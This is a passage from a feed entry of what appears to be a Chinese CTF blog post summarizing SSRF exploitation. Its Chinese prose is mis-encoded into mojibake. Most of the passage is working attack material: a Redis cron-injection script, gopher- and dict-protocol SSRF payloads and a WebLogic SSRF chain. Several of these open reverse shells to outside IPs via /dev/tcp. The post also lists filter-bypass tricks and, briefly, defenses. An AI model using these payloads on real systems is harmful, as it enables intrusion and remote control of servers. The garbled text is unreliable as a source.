src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424210730715.png" alt="image-20220424210730715"></p><p>ä¸€èˆ¬æ¢æµ‹å†…ç½‘ä¼šè¯»ä¸€ä¸‹:</p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///proc/net/arp</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211134080.png" alt="image-20220424211134080"></p><p><strong>2.åˆ©ç”¨dictåè®®</strong></p><p>ï¼ˆ1ï¼‰æŸ¥çœ‹ç«¯å£åŠç«¯å£ä¸Šè¿è¡ŒæœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯</p><pre><code>http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211349497.png" alt="image-20220424211349497"></p><p>ï¼ˆ2ï¼‰é€šè¿‡dictåè®®getshell</p><p>æœ‰å…³dictåè®®ï¼šå‘æœåŠ¡å™¨çš„ç«¯å£è¯·æ±‚ å‘½ä»¤:å‚æ•°ï¼Œå¹¶åœ¨æœ«å°¾è‡ªåŠ¨è¡¥ä¸Š<code>\r\n</code>(CRLF)<br>                          dictåè®®è¦ä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œï¼Œè€Œgopheråè®®æ‰§è¡Œä¸€æ¡å‘½ä»¤å°±è¡Œäº†</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095631-af0958b4-6d72-1.jpg" alt="img"></p><p><strong>3.åˆ©ç”¨gopheråè®®</strong></p><p>  (1)æ”»å‡»å†…ç½‘rediså¹¶åå¼¹shell</p><p>åˆ©ç”¨redisæœªæˆæƒè®¿é—®æ”»å‡»redis<br> <code>æ”»å‡»redisçš„exp</code></p><p>shell.sh</p><pre><code>echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/108.166.201.16/4444 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><p>ä½¿ç”¨è¿™ä¸ªexpéšæ„ä¸€ä¸ªç›®æ ‡ï¼Œæ•è·åˆ°æ•°æ®</p><pre><code>bash shell.sh 39.x.x.x 6379</code></pre><p>å†å¯¹æ•°æ®è¿›è¡Œä¸€äº›è½¬æ¢</p><p> è½¬æ¢è§„åˆ™ï¼š<br> å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>&gt;</code>æˆ–è€…<code>&lt;</code>é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚<br> å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯+OK é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚<br> å°†<code>\r</code>å­—ç¬¦ä¸²æ›¿æ¢æˆ<code>%0d%0a</code><br> ç©ºç™½è¡Œæ›¿æ¢ä¸º<code>%0a</code></p><p>ç»“åˆgopheråè®®æ”»å‡»å†…ç½‘redisï¼Œä½¿ç”¨ä¸Šè¾¹æ•è·æ•°æ®çš„è½¬æ¢ç»“æœå³å¯ï¼Œç„¶åè¿›è¡Œåå¼¹shellï¼š</p><pre><code>curl -v &#39;http://39.105.71.63:66/ssrf.php?url=gopher://127.0.0.1:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f108.166.201.16%2f4444%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af32d162-6d72-1.jpg" alt="img"></p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af5bb41a-6d72-1.jpg" alt="img"></p><p>è¯¶ï¼Œæè¿™ä¸ªredisè€æ˜¯æŠŠæˆ‘æœåŠ¡å™¨æå´©ï¼Œæˆ‘å°±ä¸å¤ç°äº†ã€‚</p><p>ï¼ˆ2ï¼‰ä¼ªé€ postè¯·æ±‚åå¼¹shell</p><pre><code>curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#39;</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-af8614a8-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af8614a8-6d72-1.jpg" alt="img"></a><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-afabc5e0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-afabc5e0-6d72-1.jpg" alt="img"></a><br> åå¼¹æˆåŠŸ<br> <code>192.168.1.5</code>æ˜¯å†…ç½‘WebæœåŠ¡ï¼Œæœ‰post.php</p><p><strong>4 .åˆ©ç”¨<code>http/s</code>åè®®</strong><br> æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-aff15a38-6d72-1.jpg" alt="img"></p><p>è¯´æ˜å†…ç½‘ipä¸º<code>192.168.1.3</code>çš„ä¸»æœºå­˜æ´»</p><h1 id="SSRFåº”ç”¨æ”»å‡»å®æˆ˜"><a href="#SSRFåº”ç”¨æ”»å‡»å®æˆ˜" class="headerlink" title="SSRFåº”ç”¨æ”»å‡»å®æˆ˜"></a>SSRFåº”ç”¨æ”»å‡»å®æˆ˜</h1><h2 id="1ã€gopheræ”»å‡»redis"><a href="#1ã€gopheræ”»å‡»redis" class="headerlink" title="1ã€gopheræ”»å‡»redis"></a><strong>1ã€gopheræ”»å‡»redis</strong></h2><p>å‚è€ƒ<strong>è¿œç¨‹åˆ©ç”¨ 3.åˆ©ç”¨<code>gopher</code>åè®®</strong></p><h2 id="2ã€weblogic-ssrfæ”»å‡»redis"><a href="#2ã€weblogic-ssrfæ”»å‡»redis" class="headerlink" title="2ã€weblogic ssrfæ”»å‡»redis"></a><strong>2ã€weblogic ssrfæ”»å‡»redis</strong></h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br> ç¼–è¯‘å¹¶å¯åŠ¨ç¯å¢ƒ</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>SSRFæ¼æ´å­˜åœ¨äº<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p> <strong>1.æŸ¥çœ‹ç«¯å£</strong><br> è®¿é—®</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80//æµ‹è¯•http://127.0.0.1:7001ï¼šå°†80æ›¿æ¢æˆ7001</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095633-b02c20b4-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-b02c20b4-6d72-1.jpg" alt="img"></a><br> not connectï¼Œè¯´æ˜80ç«¯å£æœªå¼€æ”¾<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b05a47d2-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b05a47d2-6d72-1.jpg" alt="img"></a><br> è¿”å›404ï¼Œè¯´æ˜ç«¯å£å¼€æ”¾<br> <strong>2.æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</strong><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b09834c0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b09834c0-6d72-1.jpg" alt="img"></a><br> è¯´æ˜å†…ç½‘ipä¸º<code>192.168.1.1</code>çš„ä¸»æœºå­˜æ´»<br> <strong>3.æ³¨å…¥HTTPå¤´ï¼Œåˆ©ç”¨Redisåå¼¹shell</strong><br> é€šè¿‡ssrfæ¢æµ‹å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ï¼Œå‘ç°172.22.0.2:6379å¯ä»¥è¿é€š<br> å’Œä¸Šè¾¹çš„è¿œç¨‹åˆ©ç”¨å‡ ä¹ä¸€æ ·ã€‚<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b0c0075c-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b0c0075c-6d72-1.jpg" alt="img"></a><br> å°†åå¼¹shellè„šæœ¬å†™å…¥/etc/crontabå®šæ—¶ä»»åŠ¡</p><pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><p>è¿›è¡Œurlç¼–ç </p><pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</code></pre><p>æ¢è¡Œç¬¦æ˜¯â€œ\r\nâ€æ¢æˆâ€œ%0D%0Aâ€ã€‚å°†urlç¼–ç åçš„å­—ç¬¦ä¸²æ”¾åœ¨ssrfçš„åŸŸååé¢ï¼Œå‘é€<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b0fc12ec-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b0fc12ec-6d72-1.jpg" alt="img"></a><br> åå¼¹æˆåŠŸ<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b1233318-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b1233318-6d72-1.jpg" alt="img"></a></p><h1 id="SSRFæ¼æ´ç›¸å…³ç»•è¿‡"><a href="#SSRFæ¼æ´ç›¸å…³ç»•è¿‡" class="headerlink" title="SSRFæ¼æ´ç›¸å…³ç»•è¿‡"></a>SSRFæ¼æ´ç›¸å…³ç»•è¿‡</h1><h2 id="1ã€å¸¸ç”¨ç»•è¿‡æ–¹æ³•"><a href="#1ã€å¸¸ç”¨ç»•è¿‡æ–¹æ³•" class="headerlink" title="1ã€å¸¸ç”¨ç»•è¿‡æ–¹æ³•"></a><strong>1ã€å¸¸ç”¨ç»•è¿‡æ–¹æ³•</strong></h2><p><strong>1.@</strong></p><pre><code>http://abc@127.0.0.1å®é™…ä¸Šæ˜¯ä»¥ç”¨æˆ·åabcè¿æ¥åˆ°ç«™ç‚¹127.0.0.1ï¼ŒåŒç†http://8.8.8.8@127.0.0.1:8080ã€http://127.0.0.1#8.8.8.8</code></pre><p>åœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œå¦‚ï¼š<br> <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br> åœ¨PHPçš„<code>parse_url</code>ä¸­ä¼šè¯†åˆ«<a href="http://www.ccc.com,è€Œ`libcur`låˆ™è¯†åˆ«ä¸ºwww.bbb.com/">www.ccc.comï¼Œè€Œ`libcur`låˆ™è¯†åˆ«ä¸ºwww.bbb.com</a><br> <strong>2.åˆ©ç”¨[::]</strong><br> å¯ä»¥åˆ©ç”¨<code>[::]</code>æ¥ç»•è¿‡localhost</p><pre><code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre><p><strong>3.æ·»åŠ ç«¯å£å·</strong></p><pre><code>http://127.0.0.1:8080</code></pre><p><strong>4.åˆ©ç”¨çŸ­ç½‘å€</strong><br> <a href="http://tool.chinaz.com/tools/dwz.aspx">ç«™é•¿å·¥å…·çŸ­ç½‘å€</a><br> <a href="http://dwz.cn/">ç™¾åº¦çŸ­ç½‘å€</a><br> <strong>5.åˆ©ç”¨ç‰¹æ®ŠåŸŸå</strong><br> åŸç†æ˜¯DNSè§£æã€‚xip.ioå¯ä»¥æŒ‡å‘ä»»æ„åŸŸåï¼Œå³</p><pre><code>127.0.0.1.xip.ioï¼Œå¯è§£æä¸º127.0.0.1</code></pre><p><strong>6.åˆ©ç”¨DNSè§£æ</strong><br> åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1<br> <strong>7.åˆ©ç”¨è¿›åˆ¶è½¬æ¢</strong></p><blockquote><p>127.0.0.1<br> å…«è¿›åˆ¶ï¼š0177.0.0.1<br> åå…­è¿›åˆ¶ï¼š0x7f.0.0.1<br> åè¿›åˆ¶ï¼š2130706433</p></blockquote><p><strong>8.å¥å·</strong></p><pre><code>127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  127.0.0.1</code></pre><p><strong>9.302è·³è½¬</strong><br> ä½¿ç”¨<a href="https://tinyurl.comç”Ÿæˆ302è·³è½¬åœ°å€/">https://tinyurl.comç”Ÿæˆ302è·³è½¬åœ°å€</a></p><h2 id="2ã€å¸¸è§é™åˆ¶"><a href="#2ã€å¸¸è§é™åˆ¶" class="headerlink" title="2ã€å¸¸è§é™åˆ¶"></a>2ã€å¸¸è§é™åˆ¶</h2><p><strong>1.é™åˆ¶ä¸º<a href="http://www.xxx.com/">http://www.xxx.com</a> åŸŸå</strong><br> é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@<br> <code>http://www.xxx.com@www.xxc.com</code><br> <strong>2.é™åˆ¶è¯·æ±‚IPä¸ä¸ºå†…ç½‘åœ°å€</strong><br> å½“ä¸å…è®¸ipä¸ºå†…ç½‘åœ°å€æ—¶<br> ï¼ˆ1ï¼‰é‡‡å–çŸ­ç½‘å€ç»•è¿‡<br> ï¼ˆ2ï¼‰é‡‡å–ç‰¹æ®ŠåŸŸå<br> ï¼ˆ3ï¼‰é‡‡å–è¿›åˆ¶è½¬æ¢<br> <strong>3.é™åˆ¶è¯·æ±‚åªä¸ºhttpåè®®</strong><br> ï¼ˆ1ï¼‰é‡‡å–302è·³è½¬<br> ï¼ˆ2ï¼‰é‡‡å–çŸ­åœ°å€</p><h1 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h1><h2 id="fileåè®®è¯»ä¸å‡ºæ–‡ä»¶"><a href="#fileåè®®è¯»ä¸å‡ºæ–‡ä»¶" class="headerlink" title="fileåè®®è¯»ä¸å‡ºæ–‡ä»¶"></a>fileåè®®è¯»ä¸å‡ºæ–‡ä»¶</h2><p><strong>1ã€æƒé™ä¸å¤Ÿï¼š</strong>å½“å‰ç”¨æˆ·å¯¹æ­¤æ–‡ä»¶æ²¡æœ‰å¯è¯»æƒé™</p><p><strong>2ã€è·¯å¾„è¾“é”™äº†ï¼š</strong>linuxç³»ç»Ÿä¸­ï¼Œfileä¹‹ååŠ è·¯å¾„æ˜¯ä¸‰ä¸ªæ–œçº¿ï¼Œä¸èƒ½å°‘ï¼šæ¯”å¦‚file:///etc/passwdï¼ˆå…¶å®å°±æ˜¯file://å’Œ/etc/passwdçš„ç»„åˆï¼‰</p><p><strong>3ã€å­˜åœ¨open_basedirï¼š</strong>å½“open_basediré…ç½®æœ‰å€¼æ—¶ï¼Œcurl_execä¸èƒ½ä½¿ç”¨fileåè®®ï¼Œå¹¶ä¸æ˜¯å—open_basedirçš„å€¼é™åˆ¶æŸäº›æ–‡ä»¶è¯»ä¸äº†ï¼Œè€Œæ˜¯æ•´ä¸ªfileåè®®éƒ½ä¸èƒ½ç”¨ã€‚è¿™æ˜¯å†™åœ¨phpçš„curl_execæºç é‡Œçš„ï¼Œç›®å‰æ²¡æ‰¾åˆ°ç»•è¿‡çš„æ–¹å¼ã€‚</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/ggmKrbiSh4fnScisOQkEciAqDHuDaiP4O9yu4IKOIoGIQOcJsNSvHK2ZHqk2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>4ã€phpæºç ä¸æ˜¾ç¤ºï¼š</strong>è¯»å–phpæºç ï¼Œå³ä½¿è¯»æˆåŠŸäº†ä¹Ÿä¸ä¼šåœ¨æµè§ˆå™¨é‡Œå›æ˜¾ï¼ˆç±»ä¼¼htmlçš„æ³¨é‡Šä¸€æ ·ï¼‰ï¼Œè¦åœ¨è¿”å›åŒ…é‡Œæˆ–è€…view-sourceä¸­å»çœ‹ã€‚</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/AVOy6sdVuBHuoZ3dYmxMwTBApWe0dmkwyeSQcppVaiav5oIkWuzgY0Ek2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>5ã€ä¸å›æ˜¾çš„ssrfï¼š</strong>ä»£ç æ²¡å†™echoï¼Œè¿”å›å€¼èµ‹åˆ°å˜é‡é‡Œï¼Œè¯»æˆåŠŸäº†ä½ ä¹Ÿçœ‹ä¸åˆ°ã€‚</p><h2 id="gopheråè®®å’Œdictåè®®å‘ä¸å‡ºåŒ…"><a href="#gopheråè®®å’Œdictåè®®å‘ä¸å‡ºåŒ…" class="headerlink" title="gopheråè®®å’Œdictåè®®å‘ä¸å‡ºåŒ…"></a>gopheråè®®å’Œdictåè®®å‘ä¸å‡ºåŒ…</h2><p>è‡ªå·±åœ¨è™šæ‹Ÿæœºæ­çš„æµ‹è¯•ç¯å¢ƒæœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ç°è±¡ï¼Œhttp/så’Œfileåè®®éƒ½èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œä½†æ˜¯<strong>ä¸èƒ½æŒ‡å®šç«¯å£</strong>åŠ<strong>ä½¿ç”¨gopherå’Œdictåè®®</strong>ï¼Œå¦åˆ™å°±åªèƒ½å‘å‡ºdnsè¯·æ±‚ï¼Œå´ä¸èƒ½å»ºç«‹tcpçš„è¿æ¥ï¼ˆdnslogå¯ä»¥æ”¶åˆ°è¯·æ±‚ï¼Œncæ”¶ä¸åˆ°ï¼‰ã€‚</p><p>åé¢æŸ¥é˜…äº†å¾ˆå¤šèµ„æ–™ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°æ˜ç¡®çš„ç­”æ¡ˆï¼Œåªæœ‰ä¸€ä¸ªç–‘ä¼¼å¯èƒ½çš„åŸå› ï¼šphpåœ¨ç¼–è¯‘æ—¶æ²¡æœ‰ä½¿ç”¨**-with-curlwrappers**å‚æ•°ä¼šå¯¼è‡´è¿™ä¸ªé—®é¢˜ã€‚ä¸è¿‡è¿™ä¸ªå‚æ•°è²Œä¼¼åœ¨é«˜ç‰ˆæœ¬è¢«å»æ‰äº†ï¼Œæ‰€ä»¥åº”è¯¥åªå½±å“ä½ç‰ˆæœ¬phpå§ã€‚</p><p>åœ¨å®æˆ˜ä¸­å¦‚æœé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œæ€»ä¸èƒ½ç™»ç›®æ ‡æœºå™¨æŠŠphpé‡æ–°ç¼–è¯‘ä¸€ä¸‹å§â€¦â€¦ï¼ˆåŠ¨ä½œå¤ªå¤§äº†ï¼Œè€Œä¸”éƒ½èƒ½ç™»æœºå™¨äº†è¿˜è¦ssrfæœ‰ä»€ä¹ˆç”¨å‘¢ï¼‰ï¼Œç›®å‰æ²¡æ‰¾åˆ°ä»€ä¹ˆåŠæ³•ç»•è¿‡ã€‚</p><h2 id="ç‰¹æ®Šç¬¦å·"><a href="#ç‰¹æ®Šç¬¦å·" class="headerlink" title="ç‰¹æ®Šç¬¦å·"></a>ç‰¹æ®Šç¬¦å·</h2><p>æµ‹è¯•ä¸€ä¸‹å„åè®®å¯¹ç‰¹æ®Šç¬¦å·çš„æ”¯æŒï¼Œä¸­æ–‡ç¬¦å·ä¸æµ‹è¯•ï¼Œæµ‹è¯•çš„æ‰€æœ‰ç¬¦å·å¦‚ä¸‹ï¼š</p><p>`~!@#$%^&amp;*()_-+=/|&#39;â€œ;:&lt;&gt;,.?{}[]</p><p><strong>ã€gopheråè®®ã€‘</strong></p><p><strong>æ­£å¸¸ç¬¦å·ï¼š</strong>ç›´æ¥ä¼ ï¼Œä¸€æ¬¡äºŒæ¬¡urlç¼–ç éƒ½å¯ä»¥</p><p><strong>%</strong> ç›´æ¥ä¼ å¯ä»¥ï¼Œä½†åé¢æ¥16è¿›åˆ¶å­—ç¬¦å°±ä¼šè½¬ä¹‰ï¼Œä¸€æ¬¡urlç¼–ç åè¿˜æ˜¯ä¸èƒ½æ¥16è¿›åˆ¶ï¼ŒäºŒæ¬¡urlç¼–ç å¯ä»¥</p><p><strong>#</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡ï¼ŒäºŒæ¬¡urlç¼–ç åå¯ä»¥</p><p><strong>&amp;</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥ï¼ŒäºŒæ¬¡urlç¼–ç ä¹Ÿå¯ä»¥</p><p><strong>+</strong> ä¼šå˜æˆç©ºæ ¼ï¼Œä¸€æ¬¡äºŒæ¬¡urlç¼–ç åéƒ½å¯ä»¥</p><p><strong>ã€dictåè®®ã€‘</strong></p><p><strong>æ­£å¸¸ç¬¦å·ï¼š</strong>ç›´æ¥ä¼ ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥ï¼ŒäºŒæ¬¡urlç¼–ç ä¸è¡Œï¼ˆä¸æ”¯æŒäºŒæ¬¡è§£ç ï¼‰</p><p>ä»¥ä¸‹å‡ä¸æ”¯æŒäºŒæ¬¡urlè§£ç </p><p><strong>%</strong> ç›´æ¥ä¼ å¯ä»¥ï¼Œåé¢æ¥16è¿›åˆ¶ä¸è¡Œä¼šè½¬ä¹‰ï¼Œä¸€æ¬¡urlç¼–ç åå¯ä»¥</p><p><strong>#</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡</p><p><strong>&amp;</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥</p><p><strong>?</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡</p><p><strong>+</strong> ä¼šå˜æˆç©ºæ ¼ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥</p><p><strong>:</strong> ä¼šå˜æˆç©ºæ ¼ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡</p><p><strong>ã€http/såè®®ã€‘</strong></p><p><strong>æ­£å¸¸ç¬¦å·ï¼š</strong>ç›´æ¥ä¼ ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥ï¼ŒäºŒæ¬¡urlç¼–ç ä¸è¡Œï¼ˆä¸æ”¯æŒäºŒæ¬¡è§£ç ï¼‰</p><p>ä»¥ä¸‹å‡ä¸æ”¯æŒäºŒæ¬¡urlè§£ç </p><p><strong>%</strong> ç›´æ¥ä¼ å¯ä»¥ï¼Œåé¢æ¥16è¿›åˆ¶ä¸è¡Œä¼šè½¬ä¹‰ï¼Œä¸€æ¬¡urlç¼–ç åå¯ä»¥</p><p><strong>#</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡</p><p><strong>&amp;</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥</p><p><strong>+</strong> ä¼šå˜æˆç©ºæ ¼ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥</p><p><strong>ã€æ€»ç»“ã€‘</strong></p><p>**%#&amp;+**ç¬¦å·å®¹æ˜“å‡ºé—®é¢˜</p><p><strong>dictåè®®</strong>é¢å¤–ä¸æ”¯æŒ**?:**ä¸¤ä¸ªç¬¦å·ï¼Œurlç¼–ç æ— æ³•ç»•è¿‡</p><p><strong>ä¸€æ¬¡urlç¼–ç </strong>å¯ä»¥ç»•è¿‡**%&amp;+<strong>ä¸‰ç§ç¬¦å·ï¼Œä¸èƒ½ç»•è¿‡</strong>#**</p><p>**gopheråè®®çš„%**éœ€è¦ç¼–ç ä¸¤æ¬¡ç»•è¿‡ï¼Œåªä¸€æ¬¡ä¸è¡Œ</p><p><strong>gopher</strong>ä¸‡èƒ½åè®®ï¼Œ<strong>æ”¯æŒäºŒæ¬¡urlè§£ç </strong>ï¼Œæ²¡æœ‰ç»•ä¸è¿‡çš„ç‰¹æ®Šç¬¦å·ã€‚</p><h1 id="SSRFæ¼æ´é˜²å¾¡"><a href="#SSRFæ¼æ´é˜²å¾¡" class="headerlink" title="SSRFæ¼æ´é˜²å¾¡"></a>SSRFæ¼æ´é˜²å¾¡</h1><p>1ã€ç¦ç”¨ä¸éœ€è¦çš„åè®®(å¦‚ï¼š<code>file:///</code>ã€<code>gopher://</code>,<code>dict://</code>ç­‰)ã€‚ä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚<br> 2ã€ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé˜²æ­¢æ ¹æ®é”™è¯¯ä¿¡æ¯åˆ¤æ–­ç«¯å£çŠ¶æ€<br> 3ã€ç¦æ­¢302è·³è½¬ï¼Œæˆ–æ¯æ¬¡è·³è½¬ï¼Œéƒ½æ£€æŸ¥æ–°çš„Hostæ˜¯å¦æ˜¯å†…ç½‘IPï¼Œç›´åˆ°æŠµè¾¾æœ€åçš„ç½‘å€<br> 4ã€è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IP</p><p>å‚è€ƒ:</p><p><a href="http://www.hackdig.com/07/hack-419420.htm">http://www.hackdig.com/07/hack-419420.htm</a></p><p><a href="https://xz.aliyun.com/t/7405#toc-2">https://xz.aliyun.com/t/7405#toc-2</a></p><p>åé¢æˆ‘æ‘†çƒ‚äº†ï¼ŒæœåŠ¡å™¨è€æ˜¯åï¼Œç­‰æœ‰æ—¶é—´ç»§ç»­å¤ç°æŠŠï¼Œå…ˆæŠ„ä¸‹å¤§ä½¬çš„æ–‡ç« ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘ç¢°åˆ°äº†æŒºå¤šSSRFé¢˜ç›®çš„åº”ç”¨ï¼Œä»¥å‰å­¦çš„å¤ªæµ…äº†ï¼Œé‡æ–°å­¦ä¹ ä¸‹ï¼Œæ‰“å¥½åŸºç¡€ã€‚&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;SSRFæ¼æ´ç®€ä»‹&quot;&gt;&lt;a href=&quot;#SSRFæ¼æ´ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;SSRFæ¼æ´ç®€ä»‹&quot;&gt;&lt;/a&gt;SSRFæ¼</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="å¸¸è§æ¼æ´å’Œæ‰‹æ³•" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="SSRF" scheme="https://sakurahack-y.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
